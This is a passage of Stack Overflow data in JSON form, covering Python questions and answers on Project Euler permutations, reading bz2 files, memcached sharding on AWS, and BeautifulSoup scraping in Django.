"Abo Taha", "link": "https://stackoverflow.com/users/14127511/abo-taha"}, "is_accepted": false, "score": 0, "last_activity_date": 1598222901, "last_edit_date": 1598222901, "creation_date": 1598196611, "answer_id": 63548805, "question_id": 37172808, "link": "https://stackoverflow.com/questions/37172808/i-want-to-make-my-solution-for-project-euler-24-more-efficient/63548805#63548805", "title": "I want to make my solution for project Euler 24 more efficient", "body": "<pre class=\"lang-py prettyprint-override\"><code>def permutation(order):\n    start = time.time()\n    digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]  # our main list.\n    original_digits = digits.copy()  # take a shallow copy of the list.\n    i = 1\n    result = 0\n    wanted_num = &quot;&quot;\n    while i &lt;= len(original_digits):\n        x = 0\n        while True:\n            # removing the number of redundant possibilities.\n            result += factorial(len(original_digits) - i)\n            x += 1\n            if result &gt; order - 1:\n                result -= factorial(len(original_digits) - i)\n                x -= 1\n                wanted_num += str(digits[x])\n                digits.remove(digits[x])  # prevent repetition.\n                break\n        i += 1\n        if result == order and len(digits) == 0:\n            break\n    return int(wanted_num), time.time() - start\n</code></pre>\n<p>Use the following line to test it:</p>\n<pre class=\"lang-py prettyprint-override\"><code>print(permutation(1000000))\n</code></pre>\n"}], "owner": {"reputation": 316, "user_id": 3553077, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/3be92e3694d6ce487b76597e3de0b167?s=128&d=identicon&r=PG&f=1", "display_name": "277roshan", "link": "https://stackoverflow.com/users/3553077/277roshan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1366, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1598222901, "creation_date": 1462999023, "question_id": 37172808, "link": "https://stackoverflow.com/questions/37172808/i-want-to-make-my-solution-for-project-euler-24-more-efficient", "title": "I want to make my solution for project Euler 24 more efficient", "body": "<p>I solved the question in 1 min 32 seconds which is a lot. My solution is below. Is there a better way to solve it?</p>\n\n<pre><code>def fill_in(letter, word):\n    perm = []\n    for i in xrange(len(word)+1):\n        the_word = word[0:i] + letter + word[i:]\n        if the_word[0] == '2':\n            perm.append(the_word)\n    return perm\n\ndef perm(string):\n    \"Find all permutations of given string\"\n    perm_list = []\n    for i in string:\n        if len(perm_list) == 0:\n            perm_list.append(i)\n        else:\n            temp = []\n            while (len(perm_list) != 0):\n                temp = temp + fill_in (i, perm_list.pop())\n            perm_list = temp\n    return perm_list\n\n\n\n\n\nj = perm(\"2013456789\")\nj.sort()\nprint j[1000000-725760-1]\n</code></pre>\n"}, {"tags": ["python", "bz2"], "comments": [{"owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 0, "creation_date": 1462998800, "post_id": 37172679, "comment_id": 61880143, "body": "Which version of python are you using? <code>bz2.open</code> is in python 3 not python 2. Try <code>bz2.BZ2File</code> instead."}, {"owner": {"reputation": 441, "user_id": 5672618, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/da05ab682942888b0b43928d51b49336?s=128&d=identicon&r=PG&f=1", "display_name": "student", "link": "https://stackoverflow.com/users/5672618/student"}, "reply_to_user": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 0, "creation_date": 1462999185, "post_id": 37172679, "comment_id": 61880342, "body": "I have python 2.7, with <code>bz2.BZ2File</code> I get the same error message"}, {"owner": {"reputation": 587, "user_id": 830621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6a3cc28a3fa7fb2727909ecf7a4a3ed7?s=128&d=identicon&r=PG", "display_name": "tjollans", "link": "https://stackoverflow.com/users/830621/tjollans"}, "edited": false, "score": 0, "creation_date": 1462999279, "post_id": 37172679, "comment_id": 61880402, "body": "That&#39;s not possible. How do you use BZ2File and what error do you get?"}, {"owner": {"reputation": 441, "user_id": 5672618, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/da05ab682942888b0b43928d51b49336?s=128&d=identicon&r=PG&f=1", "display_name": "student", "link": "https://stackoverflow.com/users/5672618/student"}, "edited": false, "score": 0, "creation_date": 1462999398, "post_id": 37172679, "comment_id": 61880457, "body": "<code>source_file = bz2.BZ2File(file, &quot;r&quot;)</code> I&#39;ve just replaces open with BZ2File"}, {"owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "reply_to_user": {"reputation": 587, "user_id": 830621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6a3cc28a3fa7fb2727909ecf7a4a3ed7?s=128&d=identicon&r=PG", "display_name": "tjollans", "link": "https://stackoverflow.com/users/830621/tjollans"}, "edited": false, "score": 0, "creation_date": 1463000773, "post_id": 37172679, "comment_id": 61881147, "body": "I&#39;m as puzzled as @tjollans - since you replaced <code>open</code> with <code>BZ2File</code>, you shouldn&#39;t get an error with &quot;open&quot;. Unless its in a different part of your code. Does my solution work for you? If not, can you add the full stack trace to your question?"}, {"owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 0, "creation_date": 1463000832, "post_id": 37172679, "comment_id": 61881175, "body": "Right after <code>import bz2</code> you could add <code>bz2.BZ2File</code> just to see if your module is corrupted."}, {"owner": {"reputation": 441, "user_id": 5672618, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/da05ab682942888b0b43928d51b49336?s=128&d=identicon&r=PG&f=1", "display_name": "student", "link": "https://stackoverflow.com/users/5672618/student"}, "edited": false, "score": 0, "creation_date": 1463047149, "post_id": 37172679, "comment_id": 61900119, "body": "Sorry, I&#39;ve meant I get the same error &quot;&#39;module&#39; object has no attribute&quot; but of course this time with BZ2File &quot;&#39;module&#39; object has no attribute &#39;BZ2File&#39;&quot;"}, {"owner": {"reputation": 441, "user_id": 5672618, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/da05ab682942888b0b43928d51b49336?s=128&d=identicon&r=PG&f=1", "display_name": "student", "link": "https://stackoverflow.com/users/5672618/student"}, "edited": false, "score": 0, "creation_date": 1463047236, "post_id": 37172679, "comment_id": 61900179, "body": "if i write &quot;from bz2 import BZ2File&quot; I&#39;ve get an error &quot;cannot import name BZ2File&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "is_accepted": true, "score": 9, "last_activity_date": 1463000144, "creation_date": 1463000144, "answer_id": 37173121, "question_id": 37172679, "link": "https://stackoverflow.com/questions/37172679/reading-first-lines-of-bz2-files-in-python/37173121#37173121", "title": "Reading first lines of bz2 files in python", "body": "<p>Here is a fully working example that includes writing and reading a test file that is much smaller than your 10000 lines. Its nice to have working examples in questions so we can test easily.</p>\n\n<pre><code>import bz2\nimport itertools\nimport codecs\n\nfile = \"file.bz2\"\nfile_10000 = \"file.txt\"\n\n# write test file with 9 lines\nwith bz2.BZ2File(file, \"w\") as fp:\n    fp.write('\\n'.join('123456789'))\n\n# the original script using BZ2File ... and 3 lines for test\n# ...and fixing bugs:\n#     1) it only writes 9999 instead of 10000\n#     2) files don't do writerow\n#     3) close the files\n\noutput_file = codecs.open(file_10000,'w+','utf-8')\n\nsource_file = bz2.BZ2File(file, \"r\")\ncount = 0\nfor line in source_file:\n    count += 1\n    if count &lt;= 3:\n       output_file.write(line)\nsource_file.close()\noutput_file.close()\n\n# show what you got\nprint('---- Test 1 ----')\nprint(repr(open(file_10000).read()))   \n</code></pre>\n\n<p>A more efficient way to do it is to break out of the <code>for</code> loop after reading the lines you want. you can even leverage iterators to thin up the code like so:</p>\n\n<pre><code># a faster way to read first 3 lines\nwith bz2.BZ2File(file) as source_file,\\\n        codecs.open(file_10000,'w+','utf-8') as output_file:\n    output_file.writelines(itertools.islice(source_file, 3))\n\n# show what you got\nprint('---- Test 2 ----')\nprint(repr(open(file_10000).read()))   \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 0, "creation_date": 1463000924, "post_id": 37173301, "comment_id": 61881241, "body": "Since python 3 also has <code>BZ2File</code> I see no need to do the dual imports."}, {"owner": {"reputation": 3501, "user_id": 3124409, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/5922e9a9b3b7aef6002860ed4515b57d?s=128&d=identicon&r=PG&f=1", "display_name": "Goodies", "link": "https://stackoverflow.com/users/3124409/goodies"}, "reply_to_user": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 0, "creation_date": 1463001068, "post_id": 37173301, "comment_id": 61881313, "body": "The <code>open</code> is wrapped with an <code>io.TextIOWrapper</code> object so you have more flexibility with encodings, etc... I prefer it to BZ2 file to begin with."}, {"owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 1, "creation_date": 1463001169, "post_id": 37173301, "comment_id": 61881367, "body": "<i>&quot;This is definitely a simpler way of doing it than the other answer,&quot;</i> are you referring to my answer? How is this simpler? It pulls all 10000 lines into memory and doesn&#39;t write an output file at all."}, {"owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 0, "creation_date": 1463001270, "post_id": 37173301, "comment_id": 61881422, "body": "You don&#39;t really have more flexibility if you also want to maintain python 2 and 3 compatibility. It just seems more complicated to me!"}, {"owner": {"reputation": 3501, "user_id": 3124409, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/5922e9a9b3b7aef6002860ed4515b57d?s=128&d=identicon&r=PG&f=1", "display_name": "Goodies", "link": "https://stackoverflow.com/users/3124409/goodies"}, "reply_to_user": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 1, "creation_date": 1463002139, "post_id": 37173301, "comment_id": 61881843, "body": "@tdelaney you can easily write the file to another. That wasn&#39;t the point. The point was to show an easy, cross-version way of opening an archive... I don&#39;t expect him to read 10,000 lines into memory. The only reason it stays is the <code>lines</code> list. If he doesn&#39;t have that, it doesn&#39;t read it into memory."}], "tags": [], "owner": {"reputation": 3501, "user_id": 3124409, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/5922e9a9b3b7aef6002860ed4515b57d?s=128&d=identicon&r=PG&f=1", "display_name": "Goodies", "link": "https://stackoverflow.com/users/3124409/goodies"}, "is_accepted": false, "score": 6, "last_activity_date": 1463002155, "last_edit_date": 1463002155, "creation_date": 1463000813, "answer_id": 37173301, "question_id": 37172679, "link": "https://stackoverflow.com/questions/37172679/reading-first-lines-of-bz2-files-in-python/37173301#37173301", "title": "Reading first lines of bz2 files in python", "body": "<p>This is definitely a simpler way of doing it than the other answer, but it would be an easy way to do so in both Python2/3. Also, it would short-circuit if you don't have >= 10,000 lines.</p>\n\n<pre><code>from bz2 import BZ2File as bzopen\n\n# writing to a file\nwith bzopen(\"file.bz2\", \"w\") as bzfout:\n    for i in range(123456):\n        bzfout.write(b\"%i\\n\" % i)\n\n# reading a bz2 archive\nwith bzopen(\"file.bz2\", \"r\") as bzfin:\n    \"\"\" Handle lines here \"\"\"\n    lines = []\n    for i, line in enumerate(bzfin):\n        if i == 10000: break\n        lines.append(line.rstrip())\n\nprint(lines)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 258, "user_id": 4811918, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-6gIB8wkwgA0/AAAAAAAAAAI/AAAAAAAAAAA/2Jrpg-a4NrM/photo.jpg?sz=128", "display_name": "rfportilla", "link": "https://stackoverflow.com/users/4811918/rfportilla"}, "is_accepted": false, "score": 1, "last_activity_date": 1585774943, "last_edit_date": 1585774943, "creation_date": 1463002178, "answer_id": 37173604, "question_id": 37172679, "link": "https://stackoverflow.com/questions/37172679/reading-first-lines-of-bz2-files-in-python/37173604#37173604", "title": "Reading first lines of bz2 files in python", "body": "<p>Just another variation.</p>\n\n<pre><code>import bz2\n\nmyfile =  'c:\\\\my_dir\\\\random.txt.bz2'\nnewfile = 'c:\\\\my_dir\\\\random_10000.txt'\n\nstream = bz2.BZ2File(myfile)\nwith open(newfile, 'w') as f:\n  for i in range(1,10000):\n    f.write(stream.readline())\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 16137, "user_id": 2026508, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d76e464967fe7ab0b42754ae5401d3ba?s=128&d=identicon&r=PG&f=1", "display_name": "jmunsch", "link": "https://stackoverflow.com/users/2026508/jmunsch"}, "is_accepted": false, "score": 0, "last_activity_date": 1481084959, "creation_date": 1481084959, "answer_id": 41009433, "question_id": 37172679, "link": "https://stackoverflow.com/questions/37172679/reading-first-lines-of-bz2-files-in-python/41009433#41009433", "title": "Reading first lines of bz2 files in python", "body": "<p>This worked for me:</p>\n\n<pre><code>sudo apt-get install python-dev\nsudo pip install backports.lzma\n</code></pre>\n"}], "owner": {"reputation": 441, "user_id": 5672618, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/da05ab682942888b0b43928d51b49336?s=128&d=identicon&r=PG&f=1", "display_name": "student", "link": "https://stackoverflow.com/users/5672618/student"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 16095, "favorite_count": 2, "accepted_answer_id": 37173121, "answer_count": 4, "score": 6, "last_activity_date": 1585774943, "creation_date": 1462998486, "question_id": 37172679, "link": "https://stackoverflow.com/questions/37172679/reading-first-lines-of-bz2-files-in-python", "title": "Reading first lines of bz2 files in python", "body": "<p>I am trying to extract 10'000 first lines from a bz2 file.</p>\n\n<pre><code>   import bz2       \n   file = \"file.bz2\"\n   file_10000 = \"file.txt\"\n\n   output_file = codecs.open(file_10000,'w+','utf-8')\n\n   source_file = bz2.open(file, \"r\")\n   count = 0\n   for line in source_file:\n       count += 1\n       if count &lt; 10000:\n           output_file.writerow(line)\n</code></pre>\n\n<p>But I get an error \"'module' object has no attribute 'open'\". Do you have any ideas? Or may be I could save 10'000 first lines to a txt file in some other way? I am on Windows.</p>\n"}, {"tags": ["python", "django", "amazon-web-services", "memcached", "amazon-elasticache"], "answers": [{"comments": [{"owner": {"reputation": 743, "user_id": 3617624, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/9a5878a4f95906e0185d1cce082dbdec?s=128&d=identicon&r=PG&f=1", "display_name": "chuseuiti", "link": "https://stackoverflow.com/users/3617624/chuseuiti"}, "edited": false, "score": 0, "creation_date": 1463012113, "post_id": 37174586, "comment_id": 61885124, "body": "But I was expecting memcached to keep the consistancy of the same key..even if it is sharding the information of the same key over different nodes..shouldnt it gives me back one unique key and not keep different references of the same key in different nodes? Regarding Redis: Then a redis cluster is only replicating the data and not scaling the size of the cache for writing proposes?"}, {"owner": {"reputation": 47988, "user_id": 267540, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2v58W.jpg?s=128&g=1", "display_name": "e4c5", "link": "https://stackoverflow.com/users/267540/e4c5"}, "reply_to_user": {"reputation": 743, "user_id": 3617624, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/9a5878a4f95906e0185d1cce082dbdec?s=128&d=identicon&r=PG&f=1", "display_name": "chuseuiti", "link": "https://stackoverflow.com/users/3617624/chuseuiti"}, "edited": false, "score": 0, "creation_date": 1463012571, "post_id": 37174586, "comment_id": 61885227, "body": "That is correct. If you have 10 1GB redis caches clustered together, your total storage capacity is 1GB. IF you have 10 memcached caches clustered together your storage is 10GB  - with different caches holding differnt keys. You are not supposed to go directly to any one cache but supposed to let the top level api decide for you which cache to goto."}], "tags": [], "owner": {"reputation": 47988, "user_id": 267540, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2v58W.jpg?s=128&g=1", "display_name": "e4c5", "link": "https://stackoverflow.com/users/267540/e4c5"}, "is_accepted": false, "score": 2, "last_activity_date": 1463007291, "creation_date": 1463007291, "answer_id": 37174586, "question_id": 37172676, "link": "https://stackoverflow.com/questions/37172676/memcached-aws-cluster-not-keeping-the-key-in-the-same-node/37174586#37174586", "title": "Memcached AWS Cluster not keeping the key in the same node", "body": "<p>That is the way it's supposed to be.</p>\n\n<blockquote>\n  <p>The following diagram illustrates a typical Memcached and a typical\n  Redis cluster. Memcached clusters contain from 1 to 20 nodes across\n  which you can horizontally partition your data. Redis</p>\n</blockquote>\n\n<p>From <a href=\"http://docs.aws.amazon.com/AmazonElastiCache/latest/UserGuide/Clusters.html\" rel=\"nofollow\">http://docs.aws.amazon.com/AmazonElastiCache/latest/UserGuide/Clusters.html</a></p>\n\n<p>The <a href=\"https://docs.djangoproject.com/en/1.9/topics/cache/\" rel=\"nofollow\">django documentation</a> says something similar.</p>\n\n<blockquote>\n  <p>One excellent feature of Memcached is its ability to share a cache\n  over multiple servers. This means you can run Memcached daemons on\n  multiple machines, and the program will treat the group of machines as\n  a single cache, without the need to duplicate cache values on each\n  machine</p>\n</blockquote>\n\n<p>In other words, you cannot directly request data from any given node in the cluster. You have to let django's cache api figure out for you how to retrieve the data.</p>\n\n<p>With redis the behaviour is the opposite. Once you write to the cluster you can query any node in the cluster for the data because it will be replicated to them all. Where as in memcache, it's sharded.</p>\n"}], "owner": {"reputation": 743, "user_id": 3617624, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/9a5878a4f95906e0185d1cce082dbdec?s=128&d=identicon&r=PG&f=1", "display_name": "chuseuiti", "link": "https://stackoverflow.com/users/3617624/chuseuiti"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1015, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463012296, "creation_date": 1462998480, "last_edit_date": 1463012296, "question_id": 37172676, "link": "https://stackoverflow.com/questions/37172676/memcached-aws-cluster-not-keeping-the-key-in-the-same-node", "title": "Memcached AWS Cluster not keeping the key in the same node", "body": "<p>I have created a memcached cluster in the Elasticache tool of AWS. </p>\n\n<p>My program in every call sets keys with some data in cache and every time that I call the server it updates the data. However while testing it with the cluster I found that it seems that is changing the node where the key is located or it is erasing it, so the moment it changes the node /or erase the key, I lose my previous information.As Im only calling to one end point for all the cluster, shouldnt it keep the consistancy of the key over the cluster and not delete the content of the key or restart the key somewhere else ? </p>\n\n<p>Is there any configuration parameter of memcached cluster to force it not to change the reference node for a key?</p>\n\n<p>Now Im using the default configuration parameters of the AWS file default.memcached1.4..and I took a look to the configuration parameters at <a href=\"http://docs.aws.amazon.com/AmazonElastiCache/latest/UserGuide/ParameterGroups.Memcached.html\" rel=\"nofollow\">http://docs.aws.amazon.com/AmazonElastiCache/latest/UserGuide/ParameterGroups.Memcached.html</a> and I dont find any information giving me tips related to how to solve this issue.\n(Pd. When I directly point my program to a specific node everything works fine)</p>\n"}, {"tags": ["python", "django", "parsing", "web-scraping", "beautifulsoup"], "comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463005786, "post_id": 37172606, "comment_id": 61883320, "body": "There is only one section with the class videos in your sample so why do you expect more? I get <code>[{&#39;img&#39;: &#39;http:&#47;&#47;hw-static.example.org&#47;u&#47;pic&#47;2016&#47;05&#47;gbllWKHPGcQy.jpg&zwnj;&#8203;&#39;, &#39;text&#39;: &#39;They Call This Guy The Vape Wizard!&#39;, &#39;link&#39;: &#39;&#47;videos&#47;video.php?v=wshhaw8XS8ZJuKleo90r&#39;}]</code> using the loop which is what it should return as there is only one"}, {"owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463009377, "post_id": 37172606, "comment_id": 61884382, "body": "@PadraicCunningham Theres more than that. Thats just a snippet. I&#39;m not going to write out all the video elements and their contents. And even if there was only one it should still show text and not be empty. The code you have in your comment is obtained without using a loop. My question is why it won&#39;t work inside the loop when the soup objects are identical."}, {"owner": {"reputation": 47988, "user_id": 267540, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2v58W.jpg?s=128&g=1", "display_name": "e4c5", "link": "https://stackoverflow.com/users/267540/e4c5"}, "edited": false, "score": 1, "creation_date": 1463022141, "post_id": 37172606, "comment_id": 61887515, "body": "Can you please first format your code? As a python dev you will know that code that&#39;s not properly indented is meaningless"}, {"owner": {"reputation": 1102, "user_id": 5660197, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/97df5665e51bcf688208167c32a7bb4e?s=128&d=identicon&r=PG&f=1", "display_name": "Tony", "link": "https://stackoverflow.com/users/5660197/tony"}, "edited": false, "score": 0, "creation_date": 1463027157, "post_id": 37172606, "comment_id": 61888769, "body": "<code>&lt;p&gt;text: {{d.text}}&lt;&#47;p&gt;</code>  Is this suppose to be a <code>f.text</code> in your loop template?"}], "answers": [{"tags": [], "owner": {"reputation": 611, "user_id": 5399800, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/435d1bb8752f6752130d82b10e35df30?s=128&d=identicon&r=PG&f=1", "display_name": "Joseph", "link": "https://stackoverflow.com/users/5399800/joseph"}, "is_accepted": false, "score": 0, "last_activity_date": 1463034075, "creation_date": 1463034075, "answer_id": 37178741, "question_id": 37172606, "link": "https://stackoverflow.com/questions/37172606/beautifulsoup4-wont-parse-the-text-if-its-in-a-loop-buit-it-will-outside-of-one/37178741#37178741", "title": "Beautifulsoup4 wont parse the text if it&#39;s in a loop buit it will outside of one, why is that?", "body": "<p>I think you're code is having trouble here:</p>\n\n<pre><code>divs = soup.findAll('section', 'videos')\n</code></pre>\n\n<p>try instead:</p>\n\n<pre><code>divs = soup.find_all('section', 'videos')\n</code></pre>\n"}], "owner": {"reputation": 771, "user_id": 3650429, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ff8404717524345f4ec8759a74663110?s=128&d=identicon&r=PG&f=1", "display_name": "nothingness", "link": "https://stackoverflow.com/users/3650429/nothingness"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 41, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463034075, "creation_date": 1462998178, "last_edit_date": 1463030471, "question_id": 37172606, "link": "https://stackoverflow.com/questions/37172606/beautifulsoup4-wont-parse-the-text-if-its-in-a-loop-buit-it-will-outside-of-one", "title": "Beautifulsoup4 wont parse the text if it&#39;s in a loop buit it will outside of one, why is that?", "body": "<p>Im currently using beautifulsoup4 and html5lib. In my views when I loop through the contents like this </p>\n\n<pre><code>def get_vlad(url):\n            html = requests.get(url, headers=headers)\n            soup = BeautifulSoup(html.text, 'html5lib')\n            divs = soup.findAll('section', 'videos')\n\n            entries = [{'text': div.strong.a.text,\n                        'link': div.a.get('href'),\n                        'img': div.find('img').get('src')\n                        } for div in divs]\n            return entries\n\n        trap_free = get_vlad(vlad_url)\n</code></pre>\n\n<p>and in my context</p>\n\n<pre><code>        context = {\n        \"entries\": entries,\n        \"url\": url,\n        \"vlad_url\": vlad_url,\n        \"free\": trap_free\n    }\n    return render(request, 'index.html', context)\n</code></pre>\n\n<p>and in my template </p>\n\n<pre><code>        {% for f in free %}\n          &lt;div class=\"col-sm-6 col-md-4\" style=\"margin-top: 30px\"&gt;\n          &lt;a href=\"{{vlad_url}}{{f.link}}\"&gt;press&lt;/a&gt;\n          &lt;img src=\"{{f.img}}\" alt=\"{{ f.text }}\" class=\"img-responsive post\"&gt;\n          &lt;p&gt;text: {{f.text}}&lt;/p&gt;\n          &lt;/div&gt;\n        {% endfor %}\n</code></pre>\n\n<p>the text does not show. But if I don't use a loop like in the following example</p>\n\n<pre><code> html = requests.get(vlad_url, headers=headers)\n soup = BeautifulSoup(html.text, 'html5lib')\n divs = soup.find('section', 'videos')\n\n img = divs.find('img').get('src')\n text = divs.strong.a.text\n link = divs.a.get('href')\n\n\ndiction = [{\n     'img': img,\n     'text': text,\n     'link': link\n }]\n\n   context = {\n    ...\n     \"lad\": diction,\n   }\n</code></pre>\n\n<p>and in my views</p>\n\n<pre><code>{% for d in lad %}\n  &lt;div class=\"col-sm-6 col-md-4\" style=\"margin-top: 30px\"&gt;\n      &lt;a href=\"{{vlad_url}}{{d.link}}\"&gt;press&lt;/a&gt;&lt;br&gt;\n      &lt;img src=\"{{d.img}}\" alt=\"{{ d.text }}\" class=\"img-responsive post\"&gt;\n      &lt;p&gt;text: {{d.text}}&lt;/p&gt;\n  &lt;/div&gt;\n {% endfor %}\n</code></pre>\n\n<p>Everything is returned including text. It works fine. What's going on? What's the proper syntax since mine isn't workin? I've also tried</p>\n\n<pre><code>'text': div.strong.a.contents[0]\n</code></pre>\n\n<p>and </p>\n\n<pre><code>'text': div.strong.a.string,\n</code></pre>\n\n<p>and just to be complete the following is the html im scraping, in case it helps</p>\n\n<pre><code>&lt;section class=\"videos\"&gt;\n   &lt;section class=\"box\"&gt;\n        &lt;a href=\"/videos/video.php?v=wshhaw8XS8ZJuKleo90r\" class=\"video-box\"&gt;\n            &lt;img src=\"http://hw-static.example.org/u/pic/2016/05/gbllWKHPGcQy.jpg\" width=\"222\" height=\"125\" alt=\"\"&gt;\n        &lt;/a&gt;\n        &lt;strong class=\"title\"&gt;&lt;a href=\"/videos/video.php?v=wshhaw8XS8ZJuKleo90r\"&gt;They Call This Guy The Vape Wizard!&lt;/a&gt;&lt;/strong&gt;\n        &lt;div&gt;\n            &lt;span class=\"views\"&gt;495&lt;/span&gt; \n            &lt;span class=\"comments\"&gt;&lt;a href=\"http://www.example.org/videos/video.phread\" data-disqus-identifier=\"94177\"&gt;&lt;/a&gt;&lt;/span&gt;\n        &lt;/div&gt;\n    &lt;/section&gt;\n&lt;/div\n</code></pre>\n"}, {"tags": ["python", "django", "forms"], "comments": [{"owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 0, "creation_date": 1463001098, "post_id": 37172577, "comment_id": 61881330, "body": "As I said in the <a href=\"http://stackoverflow.com/questions/37171746/django-file-field-update-causing-error-even-though-not-required/37172593#37172593\">very similar question that was posted just before yours</a> you should be using <code>form.cleaned_data[&#39;docfile2&#39;]</code> etc which avoids the problem completely."}, {"owner": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "reply_to_user": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 0, "creation_date": 1463002224, "post_id": 37172577, "comment_id": 61881888, "body": "didn&#39;t see that question as I was typing this one.  I see the cleaned data and even tried to get that to work.  Keeps saying the attribute doesn&#39;t exist, but I did notice your other post where you said cleaned_data doesnt get created until is_valid is ran.  So i do run 